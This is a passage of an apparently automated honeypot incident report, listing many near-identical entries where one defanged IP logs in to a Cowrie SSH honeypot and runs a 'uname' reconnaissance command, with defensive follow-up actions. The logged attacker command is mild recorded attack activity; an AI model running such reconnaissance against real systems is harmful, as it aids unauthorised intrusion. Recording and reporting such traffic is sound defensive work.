| `2026-08-08 17:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026a03179fd3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:38` | `cowrie.session.connect` |
| `2026-08-08 17:05:38` | `cowrie.client.version` |
| `2026-08-08 17:05:38` | `cowrie.client.kex` |
| `2026-08-08 17:05:39` | `cowrie.login.success` |
| `2026-08-08 17:05:40` | `cowrie.session.params` |
| `2026-08-08 17:05:40` | `cowrie.command.input` |
| `2026-08-08 17:05:40` | `cowrie.log.closed` |
| `2026-08-08 17:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f5dcd6d6932

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:45` | `cowrie.session.connect` |
| `2026-08-08 17:05:45` | `cowrie.client.version` |
| `2026-08-08 17:05:45` | `cowrie.client.kex` |
| `2026-08-08 17:05:46` | `cowrie.login.success` |
| `2026-08-08 17:05:47` | `cowrie.session.params` |
| `2026-08-08 17:05:47` | `cowrie.command.input` |
| `2026-08-08 17:05:47` | `cowrie.log.closed` |
| `2026-08-08 17:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8205e2ec1f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:51` | `cowrie.session.connect` |
| `2026-08-08 17:05:51` | `cowrie.client.version` |
| `2026-08-08 17:05:51` | `cowrie.client.kex` |
| `2026-08-08 17:05:51` | `cowrie.login.success` |
| `2026-08-08 17:05:52` | `cowrie.session.params` |
| `2026-08-08 17:05:52` | `cowrie.command.input` |
| `2026-08-08 17:05:52` | `cowrie.log.closed` |
| `2026-08-08 17:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd629c154e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:05 |
| **Last Seen** | 2026-08-08 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:05:57` | `cowrie.session.connect` |
| `2026-08-08 17:05:57` | `cowrie.client.version` |
| `2026-08-08 17:05:57` | `cowrie.client.kex` |
| `2026-08-08 17:05:58` | `cowrie.login.success` |
| `2026-08-08 17:05:58` | `cowrie.session.params` |
| `2026-08-08 17:05:58` | `cowrie.command.input` |
| `2026-08-08 17:05:59` | `cowrie.log.closed` |
| `2026-08-08 17:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effd8b364474

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:03` | `cowrie.session.connect` |
| `2026-08-08 17:06:03` | `cowrie.client.version` |
| `2026-08-08 17:06:03` | `cowrie.client.kex` |
| `2026-08-08 17:06:04` | `cowrie.login.success` |
| `2026-08-08 17:06:04` | `cowrie.session.params` |
| `2026-08-08 17:06:04` | `cowrie.command.input` |
| `2026-08-08 17:06:05` | `cowrie.log.closed` |
| `2026-08-08 17:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc371a0fb00

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:09` | `cowrie.session.connect` |
| `2026-08-08 17:06:09` | `cowrie.client.version` |
| `2026-08-08 17:06:09` | `cowrie.client.kex` |
| `2026-08-08 17:06:09` | `cowrie.login.success` |
| `2026-08-08 17:06:10` | `cowrie.session.params` |
| `2026-08-08 17:06:10` | `cowrie.command.input` |
| `2026-08-08 17:06:10` | `cowrie.log.closed` |
| `2026-08-08 17:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd46f1a63876

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:15` | `cowrie.session.connect` |
| `2026-08-08 17:06:15` | `cowrie.client.version` |
| `2026-08-08 17:06:15` | `cowrie.client.kex` |
| `2026-08-08 17:06:15` | `cowrie.login.success` |
| `2026-08-08 17:06:16` | `cowrie.session.params` |
| `2026-08-08 17:06:16` | `cowrie.command.input` |
| `2026-08-08 17:06:17` | `cowrie.log.closed` |
| `2026-08-08 17:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbf7f753c69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:21` | `cowrie.session.connect` |
| `2026-08-08 17:06:21` | `cowrie.client.version` |
| `2026-08-08 17:06:21` | `cowrie.client.kex` |
| `2026-08-08 17:06:21` | `cowrie.login.success` |
| `2026-08-08 17:06:22` | `cowrie.session.params` |
| `2026-08-08 17:06:22` | `cowrie.command.input` |
| `2026-08-08 17:06:22` | `cowrie.log.closed` |
| `2026-08-08 17:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b510470eb519

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:26` | `cowrie.session.connect` |
| `2026-08-08 17:06:26` | `cowrie.client.version` |
| `2026-08-08 17:06:26` | `cowrie.client.kex` |
| `2026-08-08 17:06:27` | `cowrie.login.success` |
| `2026-08-08 17:06:27` | `cowrie.session.params` |
| `2026-08-08 17:06:27` | `cowrie.command.input` |
| `2026-08-08 17:06:28` | `cowrie.log.closed` |
| `2026-08-08 17:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-987fba32d7ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:32` | `cowrie.session.connect` |
| `2026-08-08 17:06:32` | `cowrie.client.version` |
| `2026-08-08 17:06:32` | `cowrie.client.kex` |
| `2026-08-08 17:06:33` | `cowrie.login.success` |
| `2026-08-08 17:06:34` | `cowrie.session.params` |
| `2026-08-08 17:06:34` | `cowrie.command.input` |
| `2026-08-08 17:06:34` | `cowrie.log.closed` |
| `2026-08-08 17:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875c4e04003d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:38` | `cowrie.session.connect` |
| `2026-08-08 17:06:38` | `cowrie.client.version` |
| `2026-08-08 17:06:38` | `cowrie.client.kex` |
| `2026-08-08 17:06:39` | `cowrie.login.success` |
| `2026-08-08 17:06:40` | `cowrie.session.params` |
| `2026-08-08 17:06:40` | `cowrie.command.input` |
| `2026-08-08 17:06:40` | `cowrie.log.closed` |
| `2026-08-08 17:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec6c6014336

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:44` | `cowrie.session.connect` |
| `2026-08-08 17:06:44` | `cowrie.client.version` |
| `2026-08-08 17:06:44` | `cowrie.client.kex` |
| `2026-08-08 17:06:45` | `cowrie.login.success` |
| `2026-08-08 17:06:46` | `cowrie.session.params` |
| `2026-08-08 17:06:46` | `cowrie.command.input` |
| `2026-08-08 17:06:46` | `cowrie.log.closed` |
| `2026-08-08 17:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab813831e3f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:50` | `cowrie.session.connect` |
| `2026-08-08 17:06:50` | `cowrie.client.version` |
| `2026-08-08 17:06:50` | `cowrie.client.kex` |
| `2026-08-08 17:06:51` | `cowrie.login.success` |
| `2026-08-08 17:06:52` | `cowrie.session.params` |
| `2026-08-08 17:06:52` | `cowrie.command.input` |
| `2026-08-08 17:06:52` | `cowrie.log.closed` |
| `2026-08-08 17:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288407d192a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:06 |
| **Last Seen** | 2026-08-08 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:06:56` | `cowrie.session.connect` |
| `2026-08-08 17:06:56` | `cowrie.client.version` |
| `2026-08-08 17:06:56` | `cowrie.client.kex` |
| `2026-08-08 17:06:56` | `cowrie.login.success` |
| `2026-08-08 17:06:57` | `cowrie.session.params` |
| `2026-08-08 17:06:57` | `cowrie.command.input` |
| `2026-08-08 17:06:57` | `cowrie.log.closed` |
| `2026-08-08 17:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9025b190786a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:01` | `cowrie.session.connect` |
| `2026-08-08 17:07:01` | `cowrie.client.version` |
| `2026-08-08 17:07:02` | `cowrie.client.kex` |
| `2026-08-08 17:07:02` | `cowrie.login.success` |
| `2026-08-08 17:07:03` | `cowrie.session.params` |
| `2026-08-08 17:07:03` | `cowrie.command.input` |
| `2026-08-08 17:07:03` | `cowrie.log.closed` |
| `2026-08-08 17:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e978ccc213

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:07` | `cowrie.session.connect` |
| `2026-08-08 17:07:07` | `cowrie.client.version` |
| `2026-08-08 17:07:07` | `cowrie.client.kex` |
| `2026-08-08 17:07:08` | `cowrie.login.success` |
| `2026-08-08 17:07:09` | `cowrie.session.params` |
| `2026-08-08 17:07:09` | `cowrie.command.input` |
| `2026-08-08 17:07:09` | `cowrie.log.closed` |
| `2026-08-08 17:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c481ae355bdf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:13` | `cowrie.session.connect` |
| `2026-08-08 17:07:13` | `cowrie.client.version` |
| `2026-08-08 17:07:13` | `cowrie.client.kex` |
| `2026-08-08 17:07:14` | `cowrie.login.success` |
| `2026-08-08 17:07:14` | `cowrie.session.params` |
| `2026-08-08 17:07:14` | `cowrie.command.input` |
| `2026-08-08 17:07:15` | `cowrie.log.closed` |
| `2026-08-08 17:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1892fc10c3d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:19` | `cowrie.session.connect` |
| `2026-08-08 17:07:19` | `cowrie.client.version` |
| `2026-08-08 17:07:19` | `cowrie.client.kex` |
| `2026-08-08 17:07:20` | `cowrie.login.success` |
| `2026-08-08 17:07:21` | `cowrie.session.params` |
| `2026-08-08 17:07:21` | `cowrie.command.input` |
| `2026-08-08 17:07:21` | `cowrie.log.closed` |
| `2026-08-08 17:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49222ba19e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:24` | `cowrie.session.connect` |
| `2026-08-08 17:07:24` | `cowrie.client.version` |
| `2026-08-08 17:07:24` | `cowrie.client.kex` |
| `2026-08-08 17:07:25` | `cowrie.login.success` |
| `2026-08-08 17:07:26` | `cowrie.session.params` |
| `2026-08-08 17:07:26` | `cowrie.command.input` |
| `2026-08-08 17:07:26` | `cowrie.log.closed` |
| `2026-08-08 17:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2ae4328e05

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:30` | `cowrie.session.connect` |
| `2026-08-08 17:07:30` | `cowrie.client.version` |
| `2026-08-08 17:07:30` | `cowrie.client.kex` |
| `2026-08-08 17:07:30` | `cowrie.login.success` |
| `2026-08-08 17:07:31` | `cowrie.session.params` |
| `2026-08-08 17:07:31` | `cowrie.command.input` |
| `2026-08-08 17:07:32` | `cowrie.log.closed` |
| `2026-08-08 17:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e92ed969c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:36` | `cowrie.session.connect` |
| `2026-08-08 17:07:36` | `cowrie.client.version` |
| `2026-08-08 17:07:36` | `cowrie.client.kex` |
| `2026-08-08 17:07:36` | `cowrie.login.success` |
| `2026-08-08 17:07:37` | `cowrie.session.params` |
| `2026-08-08 17:07:37` | `cowrie.command.input` |
| `2026-08-08 17:07:38` | `cowrie.log.closed` |
| `2026-08-08 17:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6a8728ea465

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:43` | `cowrie.session.connect` |
| `2026-08-08 17:07:43` | `cowrie.client.version` |
| `2026-08-08 17:07:43` | `cowrie.client.kex` |
| `2026-08-08 17:07:43` | `cowrie.login.success` |
| `2026-08-08 17:07:44` | `cowrie.session.params` |
| `2026-08-08 17:07:44` | `cowrie.command.input` |
| `2026-08-08 17:07:44` | `cowrie.log.closed` |
| `2026-08-08 17:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81353263d47

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:48` | `cowrie.session.connect` |
| `2026-08-08 17:07:48` | `cowrie.client.version` |
| `2026-08-08 17:07:48` | `cowrie.client.kex` |
| `2026-08-08 17:07:49` | `cowrie.login.success` |
| `2026-08-08 17:07:50` | `cowrie.session.params` |
| `2026-08-08 17:07:50` | `cowrie.command.input` |
| `2026-08-08 17:07:50` | `cowrie.log.closed` |
| `2026-08-08 17:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc0a85a96d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:54` | `cowrie.session.connect` |
| `2026-08-08 17:07:54` | `cowrie.client.version` |
| `2026-08-08 17:07:54` | `cowrie.client.kex` |
| `2026-08-08 17:07:54` | `cowrie.login.success` |
| `2026-08-08 17:07:55` | `cowrie.session.params` |
| `2026-08-08 17:07:55` | `cowrie.command.input` |
| `2026-08-08 17:07:55` | `cowrie.log.closed` |
| `2026-08-08 17:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb4c5666bae5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:07 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:07:59` | `cowrie.session.connect` |
| `2026-08-08 17:07:59` | `cowrie.client.version` |
| `2026-08-08 17:07:59` | `cowrie.client.kex` |
| `2026-08-08 17:08:00` | `cowrie.login.success` |
| `2026-08-08 17:08:01` | `cowrie.session.params` |
| `2026-08-08 17:08:01` | `cowrie.command.input` |
| `2026-08-08 17:08:01` | `cowrie.log.closed` |
| `2026-08-08 17:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03d4eb5ede3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:08 |
| **Last Seen** | 2026-08-08 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
